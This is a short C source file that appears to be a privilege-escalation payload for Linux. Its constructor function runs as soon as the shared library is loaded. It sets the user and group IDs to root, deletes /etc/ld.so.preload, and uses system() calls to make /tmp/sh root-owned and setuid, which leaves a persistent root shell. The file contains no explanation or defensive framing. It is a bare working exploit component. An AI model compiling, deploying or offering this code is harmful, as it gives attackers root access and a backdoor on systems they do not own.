#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

void init(void) __attribute__((constructor));                                                             

void __attribute__((constructor)) init() {
  setuid(0);
  setgid(0);
  unlink("/etc/ld.so.preload");
  system("chown root:root /tmp/sh");
  system("chmod u+s /tmp/sh");
  _exit(0);
}
